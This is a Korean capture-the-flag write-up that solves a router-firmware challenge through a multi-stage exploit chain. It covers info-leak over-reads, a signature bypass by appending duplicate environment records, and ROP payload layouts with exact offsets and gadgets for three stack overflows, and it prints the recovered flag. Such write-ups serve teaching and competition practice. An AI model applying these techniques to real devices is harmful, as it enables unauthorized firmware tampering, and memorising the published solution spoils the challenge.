# UHCON 2026 Final — Cold Boot 풀이

> 플래그: `FLAG{34c9fa12c6917f327f3a6a6f85fc5377c397f89cf53a013390ac913d123729a6}`
>
> 최종 원격 성공 증거: `work/live_20261107-121426`
>
> 제출 상태: 경로 확인 중

## 1. 문제 개요와 분석 원칙

문제는 HomeHub R1 공유기의 업데이트 파일 `homehub-r1-1.4.2.hhu`와 동적 원격 장치를 제공합니다. 목표는 펌웨어 형식과 관리 서비스를 분석하고, 잠긴 부팅 정책을 우회하여 장치 안의 숨은 파일시스템에서 플래그를 읽는 것입니다.

원격 접속은 `nc 3.34.250.248 1337`이며, 연결할 때마다 세션별 Web UI 포트, Basic 인증 암호, 64-bit 장치 serial, UART가 제공됩니다. Web UI는 Linux가 재부팅되어도 같은 외부 세션 안에서 유지됩니다.

이 문서의 표기는 다음과 같습니다.

- **관찰**: 제공 바이너리, 컨테이너 바이트, 로컬 재현 또는 원격 로그에서 직접 확인한 사실입니다.
- **검증**: 실제 원격 장치에서 같은 결과가 재현된 사실입니다.
- **추론**: 관찰을 결합해 얻은 결론이며, 별도 표시가 없으면 최종 솔버가 이를 검증합니다.
- **미확정**: 추가 런타임 검증이 필요한 항목입니다.

최종 자동화는 문제 폴더의 `solver.py`에 있습니다.

## 2. HHU 펌웨어 추출

### 2.1 HHRU 상위 컨테이너

**관찰:** 원본 파일은 20,457,509바이트이며 SHA-256은 다음과 같습니다.

```text
d2897e7bb5ac0f0d865729c3629ed864e7ec603c961a6a4c6086d8d90f1f9262
```

상위 magic은 `HHRU`, format version은 3입니다. 헤더와 테이블은 다음과 같습니다.

| 항목 | 값 |
|---|---:|
| header size | `0x80` |
| descriptor count | 6 |
| descriptor size | `0x84` |
| descriptor table | `0x80` |
| data area | `0x1000` |
| model | `HH-R1` |
| firmware version | `1.4.2` |

각 descriptor의 핵심 필드는 다음과 같습니다.

| 상대 오프셋 | 크기 | 의미 |
|---:|---:|---|
| `+0x00` | 24 | NUL 종료 name |
| `+0x18` | 4 | kind/type |
| `+0x1c` | 4 | slot |
| `+0x20` | 8 | 첫 `HCHK`의 컨테이너 오프셋 |
| `+0x28` | 8 | chunk count/압축 메타데이터 |
| `+0x30` | 8 | 저장 payload 합계 |
| `+0x38` | 8 | 해제 후 크기 |
| `+0x40` | 8 | load address |
| `+0x48` | 32 | SHA-256 |

### 2.2 HCHK 조각

각 entry의 데이터는 연속한 `HCHK` 조각으로 저장됩니다. 조각 헤더는 16바이트입니다.

```c
struct hchk {
    char     magic[4];   // "HCHK"
    uint16_t part;
    uint16_t index;
    uint32_t size;
    uint32_t crc32;
};
```

**관찰:** 모든 조각의 CRC-32를 실제 payload와 대조했고 일치했습니다. descriptor의 packed size는 16바이트 헤더를 제외한 조각 payload의 합입니다.

| 이름 | 시작 오프셋 | 조각 수 | packed | raw | 해석 |
|---|---:|---:|---:|---:|---|
| `platform.bin` | `0x1000` | `0x93` | `0x92098` | `0x92098` | AArch64 static PIE ELF (`hhboot`) |
| `image-a.bin` | `0x939c8` | `0x8e1` | `0x8e0a7f` | `0x206e3c0` | zstd → FIT |
| `volume-a.bin` | `0x97d257` | `0xda` | `0xda000` | `0xda000` | SquashFS/xz |
| `image-r.bin` | `0xa57ff7` | `0x8e1` | `0x8e060e` | `0x206e3c0` | zstd → FIT |
| `volume-r.bin` | `0x1341415` | `0x3d` | `0x3d000` | `0x3d000` | SquashFS/xz |
| `device-data.bin` | `0x137e7e5` | 4 | `0x4000` | `0x4000` | HENV v8 |

추출 순서는 `HHRU descriptor 파싱 → HCHK CRC 검증 및 헤더 제거 → zstd 해제 → FIT/SquashFS 추출`입니다.

### 2.3 FIT와 루트 파일시스템

`image-a`와 `image-r`의 raw magic은 Flattened Image Tree의 `d0 0d fe ed`입니다. 두 FIT에는 `/images/kernel`, `/images/fdt`, SHA-256 hash 노드와 production/recovery configuration이 있습니다. kernel data는 32,956,352바이트, FDT data는 1,048,576바이트입니다.

SquashFS에서 얻은 주요 production 실행 파일은 다음과 같습니다.

| 파일 | SHA-256 | 역할 |
|---|---|---|
| `sbin/hhboot` | `6591ee95...dc4bb7e` | 부팅 정책/서비스 콘솔 |
| `usr/sbin/routerd` | `8c43b1b5...a094de` | HTTP 관리 plane |
| `usr/sbin/installerd` | `3b973e93...99e01d` | privileged 설치 daemon |
| `init` | `708275c0...a14032` | raw bank 동기화 및 서비스 기동 |

세 바이너리는 AArch64 little-endian이며, 핵심 대상은 static PIE, NX, RELRO, stack canary가 적용되어 있습니다.

## 3. 런타임 구성과 공격면

### 3.1 HTTP 관리 plane

`routerd`는 `/proc/cmdline`의 `homehub.password=`를 읽어 `admin:<password>` Basic 인증을 사용합니다. 확인한 endpoint는 다음과 같습니다.

```text
GET  /api/status
GET  /api/logs
GET  /api/config/backup
POST /api/config/restore
GET  /api/support/attest
GET  /api/support/result
POST /api/system/reboot
```

`/api/config/restore`는 `application/x-tar` USTAR를 받습니다. 첫 regular member인 `manifest.json`에 `"format":2`가 있어야 하고, 뒤의 각 파일 이름과 SHA-256 문자열이 manifest에 들어 있어야 합니다. 파일은 `/tmp/restore/<name>`에 풀립니다.

정상 restore가 installerd로 보내는 요청은 공격자 TAR와 무관하게 다시 구성됩니다. opcode 1, type `0x100`, extension length 0, source `/tmp/restore/settings.json`인 고정 `ISF6` frame입니다.

### 3.2 routerd ↔ installerd RPC

installerd는 `/run/router/install.sock`에 Unix socket을 만들고 root로 필요한 destination FD를 연 뒤 chroot/uid 1002로 권한을 낮춥니다. routerd는 uid/gid 1000이며 socket에 접근할 수 있습니다.

`ISF6` wire header는 다음과 같습니다.

| 오프셋 | 크기 | 의미 |
|---:|---:|---|
| `0x00` | 4 | `ISF6` |
| `0x04` | 2 | version 2 |
| `0x06` | 2 | opcode |
| `0x08` | 2 | reserved |
| `0x0a` | 2 | extension length |
| `0x0c` | 4 | total receive length |
| `0x10` | `0x80` | `ITK6` transaction record |
| `0x90` | 가변 | extension TLV |

routerd helper는 로컬 `[u32 wire_len][wire]`를 받아 socket에 전송하고, 최대 `0x5dc0`바이트 응답을 `/tmp/install.response`에 저장합니다. `/api/support/result`는 이 파일을 그대로 반환합니다.

## 4. HENV v8과 서명 검증 차이

### 4.1 bank 구조

env0/env1 각 bank는 정확히 `0x4000`바이트입니다.

| 오프셋 | 크기 | 의미 |
|---:|---:|---|
| `0x00` | 4 | `HENV` |
| `0x04` | 2 | version 8 |
| `0x06` | 2 | header size `0x94` |
| `0x08` | 4 | generation |
| `0x0c` | 4 | payload length |
| `0x10` | 4 | payload CRC-32 |
| `0x14` | `0x80` | raw RSA-1024 signature |
| `0x94` | 가변 | 암호화된 TLV payload |

TLV는 `tag:u8, marker=0xa4:u8, length:u16, seed:u32, ciphertext[length]`입니다. 암호화는 tag와 seed로 초기화하는 xorshift32 XOR stream이라 비밀성이 없습니다.

원본 중요 tag는 다음과 같습니다.

| tag | 원본 값 | 런타임 의미 |
|---:|---|---|
| `0x19` | `0` | service countdown |
| `0x2d` | `locked` | console policy |
| `0x43` | 64자리 hex | non-empty이면 PIN 실패 gate |
| `0x58` | `A` | slot 관련 값 |
| `0x6e` | `production` | 환경 이름 |
| `0x7b` | `verified` | integrity 상태 |

### 4.2 raw RSA canonical domain

signature는 PKCS#1 padding 없이 다음 canonical SHA-256을 직접 확인합니다.

```text
"HH-R1:P4C7:2D91:CTRL:v8:0000\0"
+ LE64(device_serial)
+ 각 tag [19,2d,43,58,6e,7b]에 대해
   U8(tag) || LE16(plaintext_length) || plaintext
```

generation, payload length, CRC, seed/ciphertext 자체는 signature domain에 없습니다. 복호화한 여섯 tag 값만 들어갑니다.

더 중요한 점은 같은 parser가 mode에 따라 중복 tag를 다르게 처리한다는 것입니다.

- **서명 검증 mode 0:** 첫 번째 일치 레코드를 찾자마자 반환합니다.
- **부팅 정책 mode 1:** payload 끝까지 순회해 마지막 일치 레코드로 output을 계속 덮습니다.

따라서 기존 여섯 레코드와 세션별 RSA signature를 보존하고, payload 끝에 중복 tag를 붙이면 서명 검증은 원본을 보지만 런타임 정책은 공격자가 추가한 값을 봅니다.

최종 forge는 다음 세 레코드를 추가합니다.

```text
tag 0x2d = "service"
tag 0x19 = "30"
tag 0x43 = ""        # zero-length
```

비활성 env1의 generation을 8로 올리고 payload length/CRC만 다시 계산합니다. env0가 generation 7이므로 다음 부팅에는 env1이 선택됩니다. 원격의 live signature는 한 바이트도 바꾸지 않습니다.

**검증:** `/api/logs` leak에서 복원한 세션별 env1으로 forge한 뒤 RSA 검증을 다시 수행해 signature가 계속 유효함을 확인했습니다. 재부팅 후 UART도 `ENV: bank=1 generation=8`, `Console policy: service`를 출력했습니다.

## 5. 취약점 체인 1 — routerd 정보 노출

### 5.1 `/api/logs` signed length over-read

backup/restore 가능한 `settings.json`의 `diagnostic_window`는 signed 16-bit 범위로 파싱됩니다. 로그 formatter는 실제로 최대 `0x1000`바이트만 쓰지만 음수일 때 `abs(value)`를 실제 문자열 길이와 비교하지 않고 HTTP body length로 반환합니다.

먼저 `/api/support/attest`를 호출하면 같은 큰 handler stack frame에 env0/env1 앞 `0x300`바이트가 놓입니다. 이어 `diagnostic_window=-0x4600`으로 `/api/logs`를 요청하면 이전 stack 내용과 현재 saved frame을 함께 받습니다.

로그 body 기준 주요 오프셋은 다음과 같습니다.

| 오프셋 | 값 |
|---:|---|
| `0x180` | env0 앞 `0x300`바이트 |
| `0x480` | env1 앞 `0x300`바이트 |
| `0x45d0` | routerd canary |
| `0x45d8` | main saved x29/stack 기준점 |
| `0x45e0` | saved LR = router PIE + `0x7748` |

이 한 번의 leak으로 세션별 HENV signature, routerd canary, PIE base, stack 주소를 모두 구합니다.

**검증:** 여러 동적 인스턴스에서 서로 다른 canary/PIE/stack 값과 정상적인 `HENV` prefix를 반복 회수했습니다.

## 6. 취약점 체인 2 — routerd PAX decoder stack overflow

### 6.1 root cause

restore TAR의 PAX extended header(typeflag `x`)에는 `path=` record를 넣을 수 있습니다. routerd의 percent decoder(`PIE+0x804c`)는 `sp+8`의 0x100-byte output 영역에 `%XX`를 임의 바이트로 해제합니다. 그러나 최대 길이 `0x3ff` 검사는 모든 byte를 저장한 뒤에야 수행됩니다.

```text
decoded output +0x100 : canary
               +0x108 : saved x29
               +0x110 : saved LR
               +0x118 : saved x19
               +0x120 : saved x20
               ...
```

`%00`도 허용되므로 canary와 64-bit 주소를 그대로 넣을 수 있습니다.

### 6.2 정상 call site를 이용한 COP/ROP

logs leak의 saved x29를 `L`이라 하면 stack 관계는 다음과 같습니다.

```text
outer_sp      = L - 0x46c0
decoder_out   = outer_sp - 0x168
frame_pointer = outer_sp + 0x100
```

decoder output `+0x268`에 `[u32 wire_len][ISF6 wire]`를 두고 saved register를 다음처럼 만듭니다.

```text
x19 = outer_sp + 0x100
x20 = 4                    # accepted HTTP fd
x22 = 0                    # cleanup free(NULL)
x30 = router PIE + 0x8f78 # mov x0,x19; bl RPC helper
```

`PIE+0x8f78`은 정상 restore의 installerd helper 호출 직전이므로, helper가 자체 `bl` return address를 설정하고 HTTP handler cleanup까지 정상적으로 이어집니다. routerd process를 죽이지 않고 여러 installer frame을 보낼 수 있습니다.

최대 0x192-byte installerd overflow frame은 4-byte prefix까지 `0x196`바이트입니다. output `+0x268..+0x3fd`에 들어가 decoder의 0x3ff 상한 안에 정확히 맞습니다.

## 7. 취약점 체인 3 — installerd leak과 policy hijack

### 7.1 opcode `0x73` status over-read

첫 routerd ROP에서는 다음 0x90-byte frame을 보냅니다.

```text
magic=ISF6, version=2, opcode=0x73
reserved=0xf000       # int16_t -4096
extension_length=0
total_length=0x90
```

installerd의 status formatter는 약 77바이트 문자열만 만들지만 negative reserved일 때 `abs((int16_t)reserved)`를 응답 길이로 반환합니다. 결과는 0x1000-byte handler stack leak이며 routerd helper가 이를 `/tmp/install.response`에 저장합니다.

`GET /api/support/result`의 주요 오프셋은 다음과 같습니다.

| 오프셋 | 값 |
|---:|---|
| `0xe00` | installerd canary |
| `0xe08` | saved x29 |
| `0xe10` | saved LR = installerd PIE + `0x785c` |

### 7.2 extension TLV 누적 길이 truncation

installerd extension parser(`PIE+0x79d8`)의 local output은 0xc0바이트지만 누적 검사는 하위 8비트만 봅니다.

```c
if ((uint8_t)(total + chunk_len) > 0xc0)
    reject();
memcpy(out + total, payload, chunk_len); // total은 64-bit 실제 값
```

최소 wrap extension은 다음과 같습니다.

```text
01 41 ff <255 controlled bytes>
```

첫 TLV로 total=1을 만든 뒤 255를 더하면 검사값은 0이지만 실제로 offset 1..255에 복사합니다. 두 번째 payload 기준 제어 위치는 다음과 같습니다.

| payload index | 값 |
|---:|---|
| `191..198` | leaked installerd canary |
| `199..206` | saved x29 |
| `207..214` | saved LR |

### 7.3 type gate 우회와 env1 쓰기

정상 opcode 1 handler는 extension parser가 반환한 뒤 `type == 0x100`만 policy 함수로 보냅니다. 그러나 parser epilogue 시점의 `x0`은 global transaction record를 가리킵니다. saved LR을 `installerd PIE+0x7b48`로 덮으면 type gate 이전에 privileged policy로 직접 return합니다.

global record는 다음 의미로 구성합니다.

```text
magic      = ITK6
version    = 4
type       = 0x227                  # env1
generation = 8
size       = 0x4000
sha256     = forged bank.bin digest
path       = /tmp/restore/bank.bin
cookie     = serial/record/digest 기반 mix
```

policy는 이미 root로 연 env1 FD를 갖고 있습니다. source의 길이, `HENV` magic, generation, SHA-256, cookie를 검사한 뒤 0x4000바이트를 씁니다. 반환 후 installerd가 crash해도 privileged write는 끝난 상태입니다.

전체 전달 순서는 다음과 같습니다.

1. 정상 restore TAR로 forged HENV를 `/tmp/restore/bank.bin`에 stage합니다.
2. routerd PAX ROP #1로 status leak frame을 보냅니다.
3. `/api/support/result`에서 installerd canary와 PIE를 얻습니다.
4. type `0x227` record와 TLV overflow frame을 생성합니다.
5. routerd PAX ROP #2로 frame을 보냅니다.
6. `/api/logs`에서 env1 generation 8 write를 다시 확인합니다.
7. `/api/system/reboot`를 호출합니다.

**검증:** 원격에서 `env1 privileged write verified, generation=8`을 확인한 뒤 재부팅해 service console까지 반복 진입했습니다.

## 8. hhboot service console

### 8.1 unlock VM

서비스 콘솔은 매 부팅 32-bit maintenance nonce를 출력합니다. `unlock RESPONSE`가 맞으면 이후 `rmap audit/import`가 허용됩니다.

응답 계산은 4개의 64-bit state를 쓰는 36-step VM입니다.

```text
state[0] = serial
state[1] = (nonce << 32) | nonce
state[2] = serial ^ 0xd6e8feb86659fd93
state[3] = ((uint32_t)nonce << 17) ^ 0xa0761d6478bd642f
```

`hhboot` file offset `0x5dfd8`의 0x90바이트 bytecode는 각 byte `i`에 대해 `encoded[i] ^ ((i*61-0x59)&0xff)`로 해제됩니다. 각 4-byte 명령의 필드는 다음과 같습니다.

```text
opcode = b0 & 7
dst    = (b0 >> 3) & 3
other  = (b0 >> 5) & 3
word   = b1 | (b2 << 8)
imm    = (b3 | (word << 40)) ^ table[b3 & 3]
```

최종 mix에서 주의할 점은 원본 serial이 아니라 VM 실행으로 갱신된 `state[0]`을 쓴다는 것입니다.

```text
r = ROR64(state[2],35) ^ ROR64(state[1],53)
r ^= state[0] ^ state[3]
r ^= r >> 31
r *= 0x9fb21c651e98df25
r ^= r >> 28
```

`work/solve_unlock.py`가 이를 구현합니다.

```powershell
python work\solve_unlock.py static_rootfs_a\sbin\hhboot 0xSERIAL 0xNONCE
```

**검증:** `work/emulate_unlock.py`로 실제 AArch64 명령 `0x8d70..0x8f54`를 Unicorn에서 직접 실행했습니다. 36개 step과 임의 64개 serial/nonce에서 Python 구현과 불일치가 없었습니다.

### 8.2 `rmap audit` stack leak

`rmap audit WINDOW`는 256-byte local buffer를 만들지만 `(int16_t)WINDOW`의 절댓값을 최대 0x600까지 출력합니다. 메모리 취약점 자체만 보면 1536바이트도 가능하지만, 실제 UART gateway는 지나치게 긴 한 줄을 전송하다 연결을 닫았습니다. 필요한 세 값은 280바이트 안에 모두 있으므로 최종 솔버는 최소 길이를 사용합니다.

```text
rmap audit 280
```

hex dump 기준:

| leak offset | 값 |
|---:|---|
| `0x100` | hhboot canary |
| `0x108` | caller FP |
| `0x110` | audit 반환 LR = hhboot PIE + `0x9150` |

`0x914c`는 `bl audit` 명령의 주소이고 저장된 LR은 그 다음 명령인 `0x9150`입니다. 따라서 정확한 계산은 다음과 같습니다.

```text
image_base = u64(leak[0x110:0x118]) - 0x9150
shell_sp   = u64(leak[0x108:0x110]) - 0x2f0
```

**검증:** 성공 세션에서 280바이트 leak으로 canary `0xf6dab34b9c21d800`, image base `0x0000ffff93300000`, caller FP `0x0000ffffc4cd66f0`을 얻었습니다. 짧은 출력은 gateway의 long-line 제한도 회피했습니다.

### 8.3 `rmap import` stack overflow와 안정적인 복귀

import profile의 HEX는 `length-byte + 그 길이의 hex data` 조각입니다. 해제기는 96-byte buffer를 쓰면서 다음 signed 8-bit 검사를 합니다.

```c
if ((int8_t)(total + chunk_len) > 0x60)
    reject();
```

최종 payload는 240바이트(`0xf0`)입니다. `(int8_t)0xf0 == -16`이므로 검사를 통과하면서 canary, saved LR, callee-saved register와 caller frame을 덮습니다.

목표는 임의 syscall이 아니라 RMAP 전역 8바이트만 쓰는 것입니다.

```text
[hhboot+0xa0008] = p32(0x1000) || p32(hidden_physical)
```

사용하는 primitive는 `memcpy`(`base+0x72d0`)와 3-인자 tail-call gadget(`base+0xed18`)입니다. gadget은 `x19/x20/x21`을 `x0/x1/x2`로 옮긴 뒤 `[x22+0x40]`의 call target으로 분기합니다.

최종 240-byte decoded payload 배치는 다음과 같습니다.

| payload offset | 값 |
|---:|---|
| `0x00` | `base+0x72d0` — `memcpy` target |
| `0x08` | `p32(0x1000) + p32(hidden_physical)` |
| `0x10` | `p32(8)` — 새 shell이 읽을 active generation |
| `0x60` | leaked canary |
| `0x68` | saved x29 = 0 |
| `0x70` | saved LR = `base+0xed18` |
| `0x78` | x19/dst = `base+0xa0008` |
| `0x80` | x20/src = `import_buffer+8` |
| `0x88` | x21/len = 8 |
| `0x90` | x22 = `import_buffer-0x40` |
| `0xc8` | gadget frame x29 = 0 |
| `0xd0` | gadget frame LR = `base+0x7b18` |
| `0xd8` | 복원 x19 = 0 |
| `0xe0` | 복원 x20 = `import_buffer` |
| `0xe8` | 복원 x21 = serial |

초기 216-byte 설계는 `memcpy` 뒤 곧바로 `base+0x8ab8`에 복귀했습니다. 그러나 그때 `x0`은 `memcpy` 반환값인 destination이고 원래 serial이 아닙니다. 새 service shell이 잘못된 serial/generation으로 초기화되어 후속 상태가 깨졌습니다.

최종 체인은 실제 main의 호출 지점 `base+0x7b18`로 돌아갑니다. 이 지점은 다음처럼 올바른 인자를 재구성합니다.

```asm
ldr w1, [x20, #0x10]  ; [import_buffer+0x10] = generation 8
mov x0, x21           ; restored serial
bl  hhboot_shell
```

따라서 gadget 이후 `x20=import_buffer`, `x21=serial`을 복원하고, `[import_buffer+0x10]=8`을 미리 둡니다. 새 shell은 정상 serial/nonce/generation을 유지하면서 프롬프트로 돌아옵니다.

명령은 다음 형태이며 전체 길이는 512-byte console line 제한 안에 들어갑니다.

```text
rmap import 0 1 0 f0<240-byte-payload-hex>
```

생성기는 `work/hhboot_rop.py`입니다.

### 8.4 숨은 ext4 physical 계산과 플래그

정상 `rmap set`은 physical을 `0x1800..0x27ff`로 제한하지만, 부팅 코드가 검사하는 숨은 sparse-disk ext4는 serial로 계산되는 훨씬 큰 위치에 있습니다.

```python
domain = b"HH-R1:K9F2:8C71:PLAT:v8:000000XYZ\0"
d = sha256(domain + p64(serial)).digest()
mix = u32(d[5:9]) ^ u32(d[17:21]) ^ u32(d[25:29])
hidden_physical = (((mix & 0xfff) + 1) << 16) | 0x1800
```

성공 세션 serial `0x4d7399c706e4fc55`의 계산값은 `0x080b2518`입니다. ROP로 이 값을 전역 RMAP에 기록한 뒤 기존 파일 명령을 사용했습니다.

```text
ext4ls rmap 0 /
ext4load rmap 0 0x100000 flag
md.b 0x100000 71
```

숨은 ext4 루트에는 `lost+found`, `calibration.json`, `flag`가 있었습니다. `flag`에서 정확히 71바이트를 읽었고, `md.b`의 hex byte를 이어 붙여 다음 값을 회수했습니다.

```text
FLAG{34c9fa12c6917f327f3a6a6f85fc5377c397f89cf53a013390ac913d123729a6}
```

## 9. 전체 공격 흐름

```text
동적 세션 생성
  ↓
정상 restore로 diagnostic_window=-0x4600 설정
  ↓
/api/support/attest → /api/logs
  ├─ live env0/env1
  └─ routerd canary/PIE/stack
  ↓
live env1에 duplicate TLV를 붙여 service/gen8 HENV 생성
  ↓
정상 restore로 bank.bin stage
  ↓
routerd PAX overflow #1 → installerd opcode 0x73
  ↓
/api/support/result → installerd canary/PIE
  ↓
routerd PAX overflow #2 → installerd TLV overflow
  ↓
policy 0x7b48 → env1 privileged write
  ↓
reboot, service console 진입
  ↓
unlock VM 응답
  ↓
rmap audit 280 → hhboot canary/PIE/stack
  ↓
rmap import overflow → hidden physical을 전역 RMAP에 기록
  ↓
ext4ls / ext4load / md.b
  ↓
FLAG
```

## 10. 재현

문제 폴더에서 다음 한 줄로 동적 인스턴스 생성부터 플래그 저장까지 자동화합니다.

```powershell
python .\solver.py
```

솔버는 매 실행 `work/live_YYYYMMDD-HHMMSS/`에 증거를 남깁니다. 최종 성공 세션은 `work/live_20261107-121426/`이며, UART에서 unlock 승인, 280-byte audit, 새 service shell 복귀, ext4 listing, 71-byte flag dump가 모두 확인됩니다.

- UART 전체 로그
- routerd/installerd stack leak 원본
- live/forged HENV bank
- stage TAR와 두 PAX ROP TAR
- post-write env1 검증 leak
- ext4 listing과 각 파일 dump
- 최종 플래그 파일

주요 보조 도구:

| 파일 | 역할 |
|---|---|
| `work/henv_tool.py` | HENV inspect/forge |
| `work/solve_unlock.py` | maintenance VM 응답 |
| `work/emulate_unlock.py` | Unicorn 독립 오라클 |
| `work/build_routerd_pax_rop.py` | routerd PAX ROP TAR 생성 |
| `vuln_work/build_installer_frames.py` | ISF6 record/status/overflow frame 생성 |
| `work/hhboot_rop.py` | audit 파싱, hidden physical, import ROP 생성 |

## 11. 검증 상태와 결론

| 단계 | 상태 |
|---|---|
| HHU/HHRU/HCHK/FIT/SquashFS 추출 | 검증 |
| HENV xorshift 복호화 및 raw-RSA 검증 | 검증 |
| `/api/logs` live HENV + routerd leak | 원격 검증 |
| routerd PAX ROP → installerd status leak | 원격 검증 |
| installerd TLV ROP → env1 generation 8 write | 원격 검증 |
| 재부팅 후 service console | 원격 검증 |
| unlock VM | AArch64 명령 단위 + 원격 검증 |
| 280-byte RMAP audit | 원격 검증 |
| 240-byte import ROP → main callsite 복귀 | 원격 검증 |
| 숨은 ext4 `flag` 71바이트 회수 | 원격 검증 |
| 플래그 | `FLAG{34c9fa12c6917f327f3a6a6f85fc5377c397f89cf53a013390ac913d123729a6}` |
| 대회 사이트 제출 | 경로 확인 중 |

최종 플래그는 `FLAG{34c9fa12c6917f327f3a6a6f85fc5377c397f89cf53a013390ac913d123729a6}`입니다. 제출 경로는 확인 중입니다.

이 문제의 핵심은 단일 stack overflow가 아니라 서로 다른 프로세스와 부팅 단계의 약점을 연결하는 것입니다. routerd의 signed length leak으로 첫 ASLR/canary를 무력화하고, PAX decoder overflow로 installer socket의 임의 frame primitive를 얻고, installerd의 두 번째 leak/overflow로 서명된 부팅 환경을 논리적으로 위조합니다. 재부팅 후에는 hhboot 자체의 leak/overflow로 정상 범위 검사를 우회해 숨은 ext4를 매핑합니다. 각 단계가 다음 단계에 필요한 정확한 정보나 권한을 제공하는 전형적인 다단계 pwn 체인입니다.
